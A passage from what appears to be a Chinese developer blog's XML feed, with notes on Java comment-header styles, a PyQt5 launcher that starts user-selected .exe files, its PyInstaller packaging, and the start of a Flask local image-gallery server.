class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br> * 用户认证配置类<br> * --------------------------------------------<br> * 作用：<br> * - 配置 Spring Security 用户认证逻辑<br> * - 自动加载 UserDetailsService 实现类<br> * - 配置 AuthenticationManager、PasswordEncoder<br> *<br> * 作者：wangza<br> * 日期：<span class="hljs-number">2025</span>-<span class="hljs-number">07</span>-<span class="hljs-number">03</span><br> * <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br> */<br></code></pre></td></tr></table></figure><p><span style="background:#fff88f">2. 样式二</span></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs markdown">/**<br><span class="hljs-bullet"> *</span> 用户认证配置类<br><span class="hljs-bullet"> *</span><br> * 功能说明：<br><span class="hljs-bullet"> *</span> - 提供用户信息服务 Bean（UserDetailsService）<br><span class="hljs-bullet"> *</span> - 配置密码加密器（PasswordEncoder）<br><span class="hljs-bullet"> *</span> - 提供认证管理器（AuthenticationManager）<br><span class="hljs-bullet"> *</span><br> * 作者：wangza<br><span class="hljs-bullet"> *</span> 日期：2025-07-03<br> <span class="hljs-emphasis">*/</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>阿里云代码规约</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：一键启动小工具</title>
    <link href="/2025/06/16/%E7%AC%94%E8%AE%B0%EF%BC%9A%E4%B8%80%E9%94%AE%E5%90%AF%E5%8A%A8%E5%B0%8F%E5%B7%A5%E5%85%B7/"/>
    <url>/2025/06/16/%E7%AC%94%E8%AE%B0%EF%BC%9A%E4%B8%80%E9%94%AE%E5%90%AF%E5%8A%A8%E5%B0%8F%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<h2 id="1-Py-代码"><a href="#1-Py-代码" class="headerlink" title="1. Py 代码"></a>1. Py 代码</h2><p>创建 <code>一键启动.py</code> 并编写代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> PyQt5.QtWidgets <span class="hljs-keyword">import</span> (<br>    QApplication, QMainWindow, QTableWidget, QTableWidgetItem, QCheckBox, <br>    QPushButton, QDialog, QVBoxLayout, QHBoxLayout, QLabel, QLineEdit, <br>    QFileDialog, QWidget<br>)<br><span class="hljs-keyword">from</span> PyQt5.QtCore <span class="hljs-keyword">import</span> Qt<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AddExeDialog</span>(<span class="hljs-title class_ inherited__">QDialog</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, parent=<span class="hljs-literal">None</span></span>):<br>        <span class="hljs-built_in">super</span>(AddExeDialog, <span class="hljs-variable language_">self</span>).__init__(parent)<br>        <span class="hljs-variable language_">self</span>.setWindowTitle(<span class="hljs-string">&quot;添加EXE文件&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.setFixedSize(<span class="hljs-number">400</span>, <span class="hljs-number">200</span>)<br><br>        <span class="hljs-comment"># 居中显示对话框</span><br>        <span class="hljs-keyword">if</span> parent:<br>            geo = parent.geometry()<br>            x = geo.x() + (geo.width() - <span class="hljs-variable language_">self</span>.width()) // <span class="hljs-number">2</span><br>            y = geo.y() + (geo.height() - <span class="hljs-variable language_">self</span>.height()) // <span class="hljs-number">2</span><br>            <span class="hljs-variable language_">self</span>.move(x, y)<br><br>        <span class="hljs-variable language_">self</span>.name_label = QLabel(<span class="hljs-string">&quot;名称：&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.name_input = QLineEdit()<br>        <span class="hljs-variable language_">self</span>.path_label = QLabel(<span class="hljs-string">&quot;路径：&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.path_input = QLineEdit()<br>        <span class="hljs-variable language_">self</span>.path_button = QPushButton(<span class="hljs-string">&quot;选择文件&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.path_button.clicked.connect(<span class="hljs-variable language_">self</span>.select_file)<br>        <span class="hljs-variable language_">self</span>.ok_button = QPushButton(<span class="hljs-string">&quot;确认&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.ok_button.clicked.connect(<span class="hljs-variable language_">self</span>.accept)<br>        <span class="hljs-variable language_">self</span>.cancel_button = QPushButton(<span class="hljs-string">&quot;取消&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.cancel_button.clicked.connect(<span class="hljs-variable language_">self</span>.reject)<br><br>        layout = QVBoxLayout()<br>        layout.addWidget(<span class="hljs-variable language_">self</span>.name_label)<br>        layout.addWidget(<span class="hljs-variable language_">self</span>.name_input)<br>        layout.addWidget(<span class="hljs-variable language_">self</span>.path_label)<br>        layout.addWidget(<span class="hljs-variable language_">self</span>.path_input)<br>        layout.addWidget(<span class="hljs-variable language_">self</span>.path_button)<br>        <br>        button_layout = QHBoxLayout()<br>        button_layout.addWidget(<span class="hljs-variable language_">self</span>.ok_button)<br>        button_layout.addWidget(<span class="hljs-variable language_">self</span>.cancel_button)<br>        layout.addLayout(button_layout)<br>        <br>        <span class="hljs-variable language_">self</span>.setLayout(layout)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">select_file</span>(<span class="hljs-params">self</span>):<br>        file_path, _ = QFileDialog.getOpenFileName(<span class="hljs-variable language_">self</span>, <span class="hljs-string">&quot;选择EXE文件&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;EXE Files (*.exe)&quot;</span>)<br>        <span class="hljs-keyword">if</span> file_path:<br>            <span class="hljs-variable language_">self</span>.path_input.setText(file_path)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_data</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.name_input.text(), <span class="hljs-variable language_">self</span>.path_input.text()<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MainWindow</span>(<span class="hljs-title class_ inherited__">QMainWindow</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>(MainWindow, <span class="hljs-variable language_">self</span>).__init__()<br>        <span class="hljs-variable language_">self</span>.setWindowTitle(<span class="hljs-string">&quot;EXE文件启动器&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.setGeometry(<span class="hljs-number">100</span>, <span class="hljs-number">100</span>, <span class="hljs-number">700</span>, <span class="hljs-number">500</span>)<br><br>        <span class="hljs-comment"># Table setup</span><br>        <span class="hljs-variable language_">self</span>.table = QTableWidget()<br>        <span class="hljs-variable language_">self</span>.table.setColumnCount(<span class="hljs-number">3</span>)<br>        <span class="hljs-variable language_">self</span>.table.setHorizontalHeaderLabels([<span class="hljs-string">&quot;勾选&quot;</span>, <span class="hljs-string">&quot;名称&quot;</span>, <span class="hljs-string">&quot;路径&quot;</span>])<br>        <span class="hljs-variable language_">self</span>.table.setColumnWidth(<span class="hljs-number">0</span>, <span class="hljs-number">50</span>)<br>        <span class="hljs-variable language_">self</span>.table.setColumnWidth(<span class="hljs-number">1</span>, <span class="hljs-number">150</span>)<br>        <span class="hljs-variable language_">self</span>.table.setColumnWidth(<span class="hljs-number">2</span>, <span class="hljs-number">450</span>)<br>        <span class="hljs-variable language_">self</span>.table.horizontalHeader().setStretchLastSection(<span class="hljs-literal">True</span>)<br><br>        <span class="hljs-comment"># Buttons</span><br>        <span class="hljs-variable language_">self</span>.add_button = QPushButton(<span class="hljs-string">&quot;添加&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.add_button.setShortcut(<span class="hljs-string">&quot;Return&quot;</span>)  <span class="hljs-comment"># Enter key shortcut</span><br>        <span class="hljs-variable language_">self</span>.add_button.clicked.connect(<span class="hljs-variable language_">self</span>.add_exe)<br>        <span class="hljs-variable language_">self</span>.delete_button = QPushButton(<span class="hljs-string">&quot;删除&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.delete_button.clicked.connect(<span class="hljs-variable language_">self</span>.delete_exe)<br>        <span class="hljs-variable language_">self</span>.save_button = QPushButton(<span class="hljs-string">&quot;保存&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.save_button.clicked.connect(<span class="hljs-variable language_">self</span>.save_config)<br>        <span class="hljs-variable language_">self</span>.start_button = QPushButton(<span class="hljs-string">&quot;启动&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.start_button.clicked.connect(<span class="hljs-variable language_">self</span>.start_exes)<br><br>        <span class="hljs-comment"># Button layout</span><br>        button_layout = QHBoxLayout()<br>        button_layout.addWidget(<span class="hljs-variable language_">self</span>.add_button)<br>        button_layout.addWidget(<span class="hljs-variable language_">self</span>.delete_button)<br>        button_layout.addWidget(<span class="hljs-variable language_">self</span>.save_button)<br>        button_layout.addWidget(<span class="hljs-variable language_">self</span>.start_button)<br>        button_layout.addStretch()<br><br>        <span class="hljs-comment"># Main layout</span><br>        main_layout = QVBoxLayout()<br>        main_layout.addWidget(<span class="hljs-variable language_">self</span>.table)<br>        main_layout.addLayout(button_layout)<br><br>        central_widget = QWidget()<br>        central_widget.setLayout(main_layout)<br>        <span class="hljs-variable language_">self</span>.setCentralWidget(central_widget)<br><br>        <span class="hljs-comment"># Load saved config</span><br>        <span class="hljs-variable language_">self</span>.load_config()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add_exe</span>(<span class="hljs-params">self</span>):<br>        dialog = AddExeDialog(<span class="hljs-variable language_">self</span>)<br>        <span class="hljs-keyword">if</span> dialog.exec_():<br>            name, path = dialog.get_data()<br>            <span class="hljs-keyword">if</span> name <span class="hljs-keyword">and</span> path:<br>                row = <span class="hljs-variable language_">self</span>.table.rowCount()<br>                <span class="hljs-variable language_">self</span>.table.insertRow(row)<br>                check_box = QCheckBox()<br>                check_box.setChecked(<span class="hljs-literal">True</span>)  <span class="hljs-comment"># Default checked</span><br>                <span class="hljs-variable language_">self</span>.table.setCellWidget(row, <span class="hljs-number">0</span>, check_box)<br>                <span class="hljs-variable language_">self</span>.table.setItem(row, <span class="hljs-number">1</span>, QTableWidgetItem(name))<br>                <span class="hljs-variable language_">self</span>.table.setItem(row, <span class="hljs-number">2</span>, QTableWidgetItem(path))<br>                <span class="hljs-variable language_">self</span>.save_config()  <span class="hljs-comment"># Auto-save after adding</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_exe</span>(<span class="hljs-params">self</span>):<br>        selected_rows = <span class="hljs-built_in">sorted</span>(<span class="hljs-built_in">set</span>(index.row() <span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.table.selectedIndexes()), reverse=<span class="hljs-literal">True</span>)<br>        <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> selected_rows:<br>            <span class="hljs-variable language_">self</span>.table.removeRow(row)<br>        <span class="hljs-variable language_">self</span>.save_config()  <span class="hljs-comment"># Auto-save after deleting</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">save_config</span>(<span class="hljs-params">self</span>):<br>        config = []<br>        <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-variable language_">self</span>.table.rowCount()):<br>            check_box = <span class="hljs-variable language_">self</span>.table.cellWidget(row, <span class="hljs-number">0</span>)<br>            name = <span class="hljs-variable language_">self</span>.table.item(row, <span class="hljs-number">1</span>).text()<br>            path = <span class="hljs-variable language_">self</span>.table.item(row, <span class="hljs-number">2</span>).text()<br>            config.append(&#123;<span class="hljs-string">&quot;name&quot;</span>: name, <span class="hljs-string">&quot;path&quot;</span>: path, <span class="hljs-string">&quot;checked&quot;</span>: check_box.isChecked()&#125;)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;config.json&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> f:<br>                json.dump(config, f, ensure_ascii=<span class="hljs-literal">False</span>, indent=<span class="hljs-number">4</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Failed to save config: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">load_config</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;config.json&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> f:<br>                config = json.load(f)<br>                <span class="hljs-variable language_">self</span>.table.setRowCount(<span class="hljs-number">0</span>)  <span class="hljs-comment"># Clear existing rows</span><br>                <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> config:<br>                    row = <span class="hljs-variable language_">self</span>.table.rowCount()<br>                    <span class="hljs-variable language_">self</span>.table.insertRow(row)<br>                    check_box = QCheckBox()<br>                    check_box.setChecked(item.get(<span class="hljs-string">&quot;checked&quot;</span>, <span class="hljs-literal">True</span>))  <span class="hljs-comment"># Use get with default</span><br>                    <span class="hljs-variable language_">self</span>.table.setCellWidget(row, <span class="hljs-number">0</span>, check_box)<br>                    <span class="hljs-variable language_">self</span>.table.setItem(row, <span class="hljs-number">1</span>, QTableWidgetItem(item[<span class="hljs-string">&quot;name&quot;</span>]))<br>                    <span class="hljs-variable language_">self</span>.table.setItem(row, <span class="hljs-number">2</span>, QTableWidgetItem(item[<span class="hljs-string">&quot;path&quot;</span>]))<br>        <span class="hljs-keyword">except</span> FileNotFoundError:<br>            <span class="hljs-keyword">pass</span>  <span class="hljs-comment"># No config file exists yet</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Failed to load config: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">start_exes</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-variable language_">self</span>.table.rowCount()):<br>            check_box = <span class="hljs-variable language_">self</span>.table.cellWidget(row, <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">if</span> check_box.isChecked():<br>                path = <span class="hljs-variable language_">self</span>.table.item(row, <span class="hljs-number">2</span>).text()<br>                <span class="hljs-keyword">try</span>:<br>                    subprocess.Popen(path)<br>                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Failed to start <span class="hljs-subst">&#123;path&#125;</span>: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app = QApplication(sys.argv)<br>    <br>    <span class="hljs-comment"># Apply QSS for modern UI styling</span><br>    qss = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    QMainWindow &#123;</span><br><span class="hljs-string">        background-color: #f0f2f5;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    QTableWidget &#123;</span><br><span class="hljs-string">        background-color: #ffffff;</span><br><span class="hljs-string">        border: 1px solid #dcdcdc;</span><br><span class="hljs-string">        border-radius: 5px;</span><br><span class="hljs-string">        font-size: 14px;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    QTableWidget::item &#123;</span><br><span class="hljs-string">        padding: 5px;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    QHeaderView::section &#123;</span><br><span class="hljs-string">        background-color: #e8ecef;</span><br><span class="hljs-string">        padding: 5px;</span><br><span class="hljs-string">        border: 1px solid #dcdcdc;</span><br><span class="hljs-string">        font-weight: bold;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    QPushButton &#123;</span><br><span class="hljs-string">        background-color: #007bff;</span><br><span class="hljs-string">        color: white;</span><br><span class="hljs-string">        border: none;</span><br><span class="hljs-string">        padding: 8px 15px;</span><br><span class="hljs-string">        border-radius: 5px;</span><br><span class="hljs-string">        font-size: 14px;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    QPushButton:hover &#123;</span><br><span class="hljs-string">        background-color: #0056b3;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    QLineEdit &#123;</span><br><span class="hljs-string">        border: 1px solid #dcdcdc;</span><br><span class="hljs-string">        border-radius: 5px;</span><br><span class="hljs-string">        padding: 5px;</span><br><span class="hljs-string">        font-size: 14px;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    QLabel &#123;</span><br><span class="hljs-string">        font-size: 14px;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    QDialog &#123;</span><br><span class="hljs-string">        background-color: #ffffff;</span><br><span class="hljs-string">        border: 1px solid #dcdcdc;</span><br><span class="hljs-string">        border-radius: 5px;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    app.setStyleSheet(qss)<br>    <br>    window = MainWindow()<br>    window.show()<br>    sys.exit(app.exec_())<br></code></pre></td></tr></table></figure><hr><h2 id="2-打包为-exe"><a href="#2-打包为-exe" class="headerlink" title="2. 打包为 exe"></a>2. 打包为 exe</h2><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-comment"># 1. 安装打包工具</span><br>pip install pyinstaller<br><br><br><span class="hljs-comment"># 2. 打包代码</span><br>pyinstaller <span class="hljs-operator">-</span>-onefile <span class="hljs-operator">-</span>-windowed <span class="hljs-operator">-</span>-icon<span class="hljs-operator">=</span><span class="hljs-string">&quot;D:<span class="hljs-char escape_">\文</span>件集合<span class="hljs-char escape_">\I</span>CO<span class="hljs-char escape_">\一</span>键启动.ico&quot;</span> <span class="hljs-operator">-</span>-distpath <span class="hljs-string">&quot;D:<span class="hljs-char escape_">\文</span>件集合&quot;</span> <span class="hljs-string">&quot;D:<span class="hljs-char escape_">\文</span>件集合<span class="hljs-char escape_">\一</span>键启动.py&quot;</span><br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">1. --onefile</span><br><span class="hljs-string">1. 打包为单个 .exe 文件。</span><br><span class="hljs-string">2. --windowed</span><br><span class="hljs-string">1. 确保 GUI 程序无控制台窗口</span><br><span class="hljs-string">3. --distpath &quot;</span>D:\文件集合\<span class="hljs-string">&quot;  &quot;</span>D:\文件集合\本地图库.py<span class="hljs-string">&quot;</span><br><span class="hljs-string">1. D:<span class="hljs-char escape_">\文</span>件集合<span class="hljs-char escape_">\ </span>是输出位置</span><br><span class="hljs-string">2. D:<span class="hljs-char escape_">\文</span>件集合<span class="hljs-char escape_">\本</span>地图库.py 是输入位置</span><br><span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><hr>]]></content>
    
    
    <categories>
      
      <category>自研小工具</category>
      
      <category>一键启动小工具</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：本地图库小工具</title>
    <link href="/2025/06/16/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%9C%AC%E5%9C%B0%E5%9B%BE%E5%BA%93%E5%B0%8F%E5%B7%A5%E5%85%B7/"/>
    <url>/2025/06/16/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%9C%AC%E5%9C%B0%E5%9B%BE%E5%BA%93%E5%B0%8F%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<h2 id="1-创建存放图片的目录"><a href="#1-创建存放图片的目录" class="headerlink" title="1. 创建存放图片的目录"></a>1. 创建存放图片的目录</h2><p>目录路径：D:\文件集合\本地图库，向内存放一些图片</p><hr><h2 id="2-编写-Py-代码"><a href="#2-编写-Py-代码" class="headerlink" title="2. 编写 Py 代码"></a>2. 编写 Py 代码</h2><p>创建 <code>本地图库.py</code> 并编写代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, send_from_directory, abort<br><br>app = Flask(__name__)<br>IMAGE_FOLDER = <span class="hljs-string">r&#x27;D:\文件集合\本地图库&#x27;</span><br>image_map = &#123;&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_images</span>():<br>    images = &#123;&#125;<br>    <span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> os.listdir(IMAGE_FOLDER):<br>        <span class="hljs-keyword">if</span> filename.lower().endswith((<span class="hljs-string">&#x27;.jpg&#x27;</span>, <span class="hljs-string">&#x27;.jpeg&#x27;</span>, <span class="hljs-string">&#x27;.png&#x27;</span>, <span class="hljs-string">&#x27;.gif&#x27;</span>)):<br>            name = os.path.splitext(filename)[<span class="hljs-number">0</span>]<br>            images[name] = filename<br>    <span class="hljs-keyword">return</span> images<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">refresh_images_periodically</span>(<span class="hljs-params">interval=<span class="hljs-number">300</span></span>):<br>    <span class="hljs-keyword">global</span> image_map<br>    image_map = load_images()<br>    <span class="hljs-comment"># 设定下一次5分钟后调用自己，实现循环</span><br>    threading.Timer(interval, refresh_images_periodically).start()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span 